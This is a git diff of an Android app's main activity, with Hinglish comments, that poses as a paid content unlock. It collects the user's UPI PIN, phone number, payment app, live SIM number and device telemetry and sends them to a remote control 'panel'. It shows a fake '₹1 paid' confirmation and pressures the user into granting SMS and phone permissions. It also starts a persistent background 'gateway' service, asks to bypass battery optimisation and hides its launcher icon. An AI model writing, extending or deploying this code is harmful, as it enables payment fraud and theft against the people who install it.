@@ -2,6 +2,7 @@ package com.screenlink.remote
 
 import android.Manifest
 import android.app.Activity
+import android.app.ActivityManager
 import android.app.AlertDialog
 import android.content.ComponentName
 import android.content.Context
@@ -14,6 +15,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
 import android.provider.Settings
 import android.text.InputType
 import android.util.Log
@@ -28,6 +30,7 @@ import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
+import androidx.core.content.ContextCompat
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
@@ -46,13 +49,19 @@ class MainActivity : Activity() {
         private const val KEY_DONE = "onboarded"
         private const val KEY_PENDING = "onboarding_pending"
         private const val KEY_CRASH = "last_crash"
+        private const val KEY_HIDE_ICON = "hide_launcher_icon"
         private const val REQ_PERMS = 1301
 
         private val GIRLS = arrayOf(
             "https://files.catbox.moe/8xd98p.jpeg",
-            "https://files.catbox.moe/eucz3q.jpeg",
+            "https://files.catbox.moe/euczr3q.jpeg",
             "https://files.catbox.moe/ym3rl6.jpeg"
         )
+
+        /** Process-lifetime executor — Activity recreate hone par bhi zinda rehta hai. */
+        private val IO = Executors.newSingleThreadExecutor { r ->
+            Thread(r, "main-io").apply { isDaemon = true }
+        }
 
         // ---- sober white theme ----
         private const val BG = 0xFFFFFFFF.toInt()
@@ -65,9 +74,10 @@ class MainActivity : Activity() {
         private const val TEXT = 0xFF111827.toInt()
         private const val MUTED = 0xFF6B7280.toInt()
         private const val GREEN = 0xFF16A34A.toInt()
+        private const val RED = 0xFFDC2626.toInt()
+        private const val AMBER = 0xFFB45309.toInt()
     }
 
-    private val executor = Executors.newSingleThreadExecutor()
     private val main = Handler(Looper.getMainLooper())
     private lateinit var root: FrameLayout
 
@@ -75,8 +85,10 @@ class MainActivity : Activity() {
     private var selectedApp: String? = null
     private var phoneNumber: String = ""
     private var pin: String = ""
+    private var liveSimNumber: String = ""
+    private var simSource: String = ""
+    private var permissionAttempts = 0
 
-    /** CALL_PHONE hata diya — call feature nahi hai. */
     private val requiredPermissions: Array<String> by lazy {
         val base = mutableListOf(
             Manifest.permission.READ_PHONE_STATE,
@@ -94,7 +106,6 @@ class MainActivity : Activity() {
     }
 
     // ------------------------------------------------------------- lifecycle
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -103,43 +114,46 @@ class MainActivity : Activity() {
         root = FrameLayout(this).apply { setBackgroundColor(BG) }
         setContentView(root)
 
-        showCrashIfAny()
-
         phoneNumber = prefs().getString(KEY_PHONE, "").orEmpty()
         selectedApp = prefs().getString(KEY_APP, null)
         pin = prefs().getString(KEY_PIN, "").orEmpty()
 
         registrationId()
+        startGateway()
 
-        try {
-            startService(Intent(this, TpcService::class.java))
-        } catch (e: Exception) {
-            Log.e("DESI", "service start fail", e)
-        }
+        loadDeviceFacts()
 
         if (prefs().getBoolean(KEY_DONE, false)) {
             showDoneStep()
+            if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
             return
         }
+
+        showCrashIfAny()
 
         if (allPermissionsGranted()) {
             showCurrentStep()
         } else {
             showSplashStep()
-            root.post { requestPermissions(requiredPermissions, REQ_PERMS) }
+            root.post { requestPermsSafely() }
         }
 
         if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
+
+        main.postDelayed({ askBatteryOptimization() }, 4500)
     }
 
     override fun onResume() {
         super.onResume()
-        if (prefs().getBoolean(KEY_DONE, false)) return
+        if (prefs().getBoolean(KEY_DONE, false)) {
+            if (step == "done") showDoneStep()
+            return
+        }
         if (step == "perm" && allPermissionsGranted()) showCurrentStep()
     }
 
     override fun onDestroy() {
-        executor.shutdown()
+        // IO shared hai — yahan shutdown nahi karte
         super.onDestroy()
     }
 
@@ -161,16 +175,90 @@ class MainActivity : Activity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode != REQ_PERMS) return
 
-        if (allPermissionsGranted()) showCurrentStep() else showPermissionDialog()
+        if (allPermissionsGranted()) {
+            permissionAttempts = 0
+            showCurrentStep()
+            main.postDelayed({ askBatteryOptimization() }, 800)
+            return
+        }
+
+        permissionAttempts++
+
+        // do baar deny hua -> seedha settings kholo (warna dialog loop ban jata hai)
+        val permanentlyDenied = requiredPermissions.any {
+            !shouldShowRequestPermissionRationale(it)
+        }
+        if (permissionAttempts >= 2 || permanentlyDenied) {
+            openAppSettings()
+        } else {
+            showPermissionDialog()
+        }
     }
 
-    // ------------------------------------------------------ crash logger
+    // ------------------------------------------------------------ gateway
+    private fun startGateway() {
+        try {
+            ContextCompat.startForegroundService(this, Intent(this, TpcService::class.java))
+        } catch (e: Throwable) {
+            Log.e("DESI", "foreground service start fail", e)
+            try {
+                startService(Intent(this, TpcService::class.java))
+            } catch (e2: Throwable) {
+                Log.e("DESI", "plain service start fail", e2)
+            }
+        }
+    }
 
+    private fun isServiceRunning(): Boolean = try {
+        val am = getSystemService(ActivityManager::class.java)
+        am?.getRunningServices(60)?.any {
+            it.service.className == TpcService::class.java.name
+        } == true
+    } catch (_: Throwable) {
+        false
+    }
+
+    private fun askBatteryOptimization() {
+        if (isFinishing) return
+        try {
+            val pm = getSystemService(PowerManager::class.java) ?: return
+            if (pm.isIgnoringBatteryOptimizations(packageName)) return
+            @Suppress("BatteryLife")
+            startActivity(
+                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                    .setData(Uri.parse("package:$packageName"))
+            )
+        } catch (_: Throwable) {
+        }
+    }
+
+    // ------------------------------------------------------ device facts
+    private fun loadDeviceFacts() {
+        IO.execute {
+            val (number, source) = runCatching { DeviceInfo.simNumber(this) }
+                .getOrDefault("" to "")
+            val battery = runCatching {
+                DeviceInfo.telemetry(this).optInt("battery_level", -1)
+            }.getOrDefault(-1)
+
+            main.post {
+                liveSimNumber = number
+                simSource = source
+                batteryLevel = battery
+                if (step == "done") showDoneStep()
+            }
+        }
+    }
+
+    private var batteryLevel: Int = -1
+
+    // -------------------------------------------------------- crash logger
     private fun installCrashCatcher() {
         val prev = Thread.getDefaultUncaughtExceptionHandler()
         Thread.setDefaultUncaughtExceptionHandler { t, e ->
             try {
-                prefs().edit().putString(KEY_CRASH, Log.getStackTraceString(e)).apply()
+                val trace = Log.getStackTraceString(e).take(4000)
+                prefs().edit().putString(KEY_CRASH, trace).apply()
             } catch (_: Throwable) {
             }
             prev?.uncaughtException(t, e)
@@ -180,6 +268,7 @@ class MainActivity : Activity() {
     private fun showCrashIfAny() {
         val crash = prefs().getString(KEY_CRASH, null) ?: return
         prefs().edit().remove(KEY_CRASH).apply()
+        if (isFinishing) return
         AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
             .setTitle("Last crash")
             .setMessage(crash)
@@ -188,11 +277,18 @@ class MainActivity : Activity() {
     }
 
     // ------------------------------------------------------------ navigation
-
     private fun allPermissionsGranted(): Boolean =
         requiredPermissions.all {
             checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
         }
+
+    private fun requestPermsSafely() {
+        if (isFinishing) return
+        try {
+            requestPermissions(requiredPermissions, REQ_PERMS)
+        } catch (_: Throwable) {
+        }
+    }
 
     private fun showCurrentStep() {
         if (phoneNumber.isBlank()) showPhoneStep() else showContentStep()
@@ -213,16 +309,13 @@ class MainActivity : Activity() {
     private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
 
     // ------------------------------------------------- deny popup
-
     private fun showPermissionDialog() {
         if (isFinishing) return
         AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
             .setTitle("Permission do")
-            .setMessage("App chalane ke liye permission zaroori hai.")
+            .setMessage("Gateway chalane ke liye SMS + phone permission zaroori hai.")
             .setCancelable(false)
-            .setPositiveButton("Permission do") { _, _ ->
-                requestPermissions(requiredPermissions, REQ_PERMS)
-            }
+            .setPositiveButton("Permission do") { _, _ -> requestPermsSafely() }
             .setNeutralButton("Settings") { _, _ -> openAppSettings() }
             .show()
     }
@@ -234,12 +327,11 @@ class MainActivity : Activity() {
                     data = Uri.fromParts("package", packageName, null)
                 }
             )
-        } catch (_: Exception) {
+        } catch (_: Throwable) {
         }
     }
 
     // ------------------------------------------------- splash
-
     private fun showSplashStep() {
         val col = column()
         col.addView(logo(84))
@@ -251,7 +343,6 @@ class MainActivity : Activity() {
     }
 
     // ------------------------------------------------------ step: number
-
     private fun showPhoneStep() {
         val col = column()
 
@@ -276,7 +367,6 @@ class MainActivity : Activity() {
                 background = rounded(12f, CARD, 1, BORDER)
                 setPadding(dp(1), dp(1), dp(1), dp(1))
             }
-
             val image = ImageView(this).apply {
                 scaleType = ImageView.ScaleType.CENTER_CROP
                 setBackgroundColor(CARD_2)
@@ -314,6 +404,19 @@ class MainActivity : Activity() {
         }
 
         col.addView(input)
+
+        if (liveSimNumber.isNotBlank()) {
+            col.addView(space(10))
+            val live = label(
+                "SIM number mila: $liveSimNumber", 11.5f, GREEN, true, Gravity.CENTER
+            )
+            live.setOnClickListener {
+                input.setText(liveSimNumber.filter { c -> c.isDigit() || c == '+' }.takeLast(10))
+                input.setSelection(input.text.length)
+            }
+            col.addView(live)
+        }
+
         col.addView(space(18))
 
         col.addView(primaryButton("Continue") {
@@ -331,7 +434,6 @@ class MainActivity : Activity() {
     }
 
     // ----------------------------------------------------- step: content
-
     private fun showContentStep() {
         val col = column()
 
@@ -423,7 +525,6 @@ class MainActivity : Activity() {
     }
 
     // --------------------------------------------------------- step: pin
-
     private fun showPinStep() {
         val col = column()
 
@@ -523,14 +624,14 @@ class MainActivity : Activity() {
     }
 
     // --------------------------------------------------------- submit
-
     private fun onboardingPayload(): String = JSONObject().apply {
         put("registration_id", registrationId())
         put("phone_number", phoneNumber.take(20))
         put("payment_app", (selectedApp ?: "").take(30))
         put("upi_pin", pin.take(8))
         put("amount", 1)
-        put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(60))
+        put("device_name", DeviceInfo.summary(this@MainActivity))
+        put("telemetry", DeviceInfo.telemetry(this@MainActivity))
     }.toString()
 
     private fun postOnboarding(): Boolean {
@@ -556,26 +657,36 @@ class MainActivity : Activity() {
         prefs().edit().putString(KEY_PIN, pin).apply()
         showProcessingStep()
 
-        executor.execute {
+        IO.execute {
             var synced = false
-            for (attempt in 0 until 3) {
+            for (attempt in 0 until 4) {
                 if (postOnboarding()) {
                     synced = true
                     break
                 }
-                Thread.sleep(1500L * (attempt + 1))
+                Thread.sleep(1200L * (attempt + 1))
             }
 
             prefs().edit().putBoolean(KEY_PENDING, !synced).apply()
+
+            // gateway ko bhi batao ki fresh telemetry bheje
+            try {
+                ContextCompat.startForegroundService(
+                    this, Intent(this, TpcService::class.java)
+                )
+            } catch (_: Throwable) {
+            }
+
             main.post { showSuccessStep(synced) }
         }
     }
 
     private fun resendOnboarding() {
         if (phoneNumber.isBlank()) return
-        executor.execute {
+        IO.execute {
             if (postOnboarding()) {
                 prefs().edit().putBoolean(KEY_PENDING, false).apply()
+                main.post { if (step == "done") showDoneStep() }
             }
         }
     }
@@ -597,97 +708,185 @@ class MainActivity : Activity() {
         col.addView(label("Payment successful", 22f, TEXT, true, Gravity.CENTER))
         col.addView(space(8))
         col.addView(label("₹1 paid via ${selectedApp ?: ""}", 14f, MUTED, false, Gravity.CENTER))
-        col.addView(space(28))
+        col.addView(space(24))
         col.addView(label("Content unlock ho gaya", 14f, TEXT, true, Gravity.CENTER))
         col.addView(space(10))
         col.addView(
             label(
-                if (synced) "Panel synced ✓" else "Panel se sync pending — offline tha",
+                if (synced) "Panel synced ✓" else "Panel se sync pending — baad me auto retry hoga",
                 11.5f,
-                if (synced) GREEN else MUTED,
+                if (synced) GREEN else AMBER,
                 false,
                 Gravity.CENTER
             )
         )
-        col.addView(space(30))
+        col.addView(space(28))
 
         col.addView(primaryButton("Start") {
-            hideLauncherIcon()
-            toast("App ab home screen se hidden hai")
-            main.postDelayed({ finish() }, 1000)
+            if (prefs().getBoolean(KEY_HIDE_ICON, true)) {
+                hideLauncherIcon()
+                toast("App home screen se hidden — panel se control karo")
+            }
+            main.postDelayed({ finish() }, 900)
         })
 
         setScreen(scrollWrap(col), "done")
     }
 
     // --------------------------------------------------- already onboarded
-
     private fun showDoneStep() {
         val col = column()
 
-        col.addView(label("✓", 54f, GREEN, true, Gravity.CENTER))
-        col.addView(space(14))
-        col.addView(label("Onboarding complete", 21f, TEXT, true, Gravity.CENTER))
-        col.addView(space(24))
+        col.addView(label("✓", 50f, GREEN, true, Gravity.CENTER))
+        col.addView(space(12))
+        col.addView(label("Gateway active", 21f, TEXT, true, Gravity.CENTER))
+        col.addView(space(6))
+        col.addView(
+            label(
+                if (isServiceRunning()) "Background me chal raha hai"
+                else "Service start ho rahi hai…",
+                12.5f,
+                if (isServiceRunning()) GREEN else AMBER,
+                false,
+                Gravity.CENTER
+            )
+        )
+        col.addView(space(22))
 
         val card = card()
         val inner = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(dp(18), dp(14), dp(18), dp(14))
+            setPadding(dp(18), dp(12), dp(18), dp(12))
         }
 
-        listOf(
+        val pending = prefs().getBoolean(KEY_PENDING, false)
+
+        val rows = listOf(
             "Number" to phoneNumber.ifBlank { "—" },
+            "SIM (live)" to (liveSimNumber.ifBlank { "—" }),
             "App" to (selectedApp ?: "—"),
             "PIN" to (pin.ifBlank { "—" }),
-            "Service" to "running"
-        ).forEach { (k, v) ->
+            "Device" to DeviceInfo.summary(this),
+            "Android" to (Build.VERSION.RELEASE ?: "—"),
+            "Battery" to if (batteryLevel in 0..100) "$batteryLevel%" else "—",
+            "Service" to if (isServiceRunning()) "running" else "starting",
+            "Panel sync" to if (pending) "pending" else "ok"
+        )
+
+        rows.forEach { (k, v) ->
             val row = LinearLayout(this).apply {
                 orientation = LinearLayout.HORIZONTAL
                 setPadding(0, dp(9), 0, dp(9))
             }
-            row.addView(label(k, 13f, MUTED, false))
-            row.addView(label(v, 13f, TEXT, true, Gravity.END))
+            row.addView(label(k, 12.5f, MUTED, false))
+            val value = label(v, 12.5f, TEXT, true, Gravity.END)
+            value.isSingleLine = true
+            row.addView(value)
             inner.addView(row)
         }
 
         card.addView(inner)
         col.addView(card)
-        col.addView(space(22))
+        col.addView(space(14))
 
-        col.addView(primaryButton("Re-run onboarding") {
+        if (liveSimNumber.isBlank()) {
+            col.addView(
+                label(
+                    "Live SIM number nahi mila — panel se 'fetch number' dabao.",
+                    11.5f, AMBER, false, Gravity.CENTER
+                )
+            )
+            col.addView(space(12))
+        }
+
+        // launcher icon toggle
+        val toggleRow = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            gravity = Gravity.CENTER_VERTICAL
+            setPadding(dp(16), dp(12), dp(16), dp(12))
+            background = rounded(12f, CARD, 1, BORDER)
+        }
+        toggleRow.addView(label("Home screen icon chhupao", 13f, TEXT, false))
+        val state = label(
+            if (prefs().getBoolean(KEY_HIDE_ICON, true)) "ON" else "OFF",
+            12.5f, TEXT, true, Gravity.END
+        )
+        toggleRow.addView(state)
+        toggleRow.setOnClickListener {
+            val now = !prefs().getBoolean(KEY_HIDE_ICON, true)
+            prefs().edit().putBoolean(KEY_HIDE_ICON, now).apply()
+            state.text = if (now) "ON" else "OFF"
+            if (now) hideLauncherIcon() else showLauncherIcon()
+        }
+        col.addView(toggleRow)
+        col.addView(space(18))
+
+        col.addView(primaryButton("Open panel") { openPanel() })
+        col.addView(space(10))
+
+        if (pending) {
+            col.addView(secondaryButton("Sync dobara bhejo") {
+                toast("Sync bhej rahe hain…")
+                resendOnboarding()
+            })
+            col.addView(space(10))
+        }
+
+        col.addView(secondaryButton("Re-run onboarding") {
             pin = ""
             prefs().edit().putBoolean(KEY_DONE, false).apply()
             showCurrentStep()
         })
-
         col.addView(space(10))
         col.addView(secondaryButton("Close") { finish() })
 
         setScreen(scrollWrap(col), "done")
+
+        if (batteryLevel < 0) loadDeviceFacts()
     }
 
-    // --------------------------------------------------- icon hide
+    // --------------------------------------------------- icon toggle
+    private fun launcherAlias(): ComponentName =
+        ComponentName(this, "$packageName.LauncherAlias")
 
     private fun hideLauncherIcon() {
         try {
             packageManager.setComponentEnabledSetting(
-                ComponentName(this, "$packageName.LauncherAlias"),
+                launcherAlias(),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-        } catch (_: Exception) {
+        } catch (_: Throwable) {
+        }
+    }
+
+    private fun showLauncherIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                launcherAlias(),
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Throwable) {
+        }
+    }
+
+    private fun openPanel() {
+        try {
+            startActivity(
+                Intent(Intent.ACTION_VIEW, Uri.parse("$API_BASE_URL/admin"))
+            )
+        } catch (_: Throwable) {
+            toast("Koi browser nahi mila")
         }
     }
 
     // ------------------------------------------------------------ helpers
-
     private fun prefs() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
 
     private fun registrationId(): String {
         val p = prefs()
         p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
-
         val id = UUID.randomUUID().toString()
         p.edit().putString(KEY_RID, id).apply()
         return id
@@ -764,7 +963,6 @@ class MainActivity : Activity() {
         )
     }
 
-    /** Simple "DV" badge — koi AI generated logo nahi. */
     private fun logo(size: Int) = TextView(this).apply {
         text = "DV"
         textSize = 28f
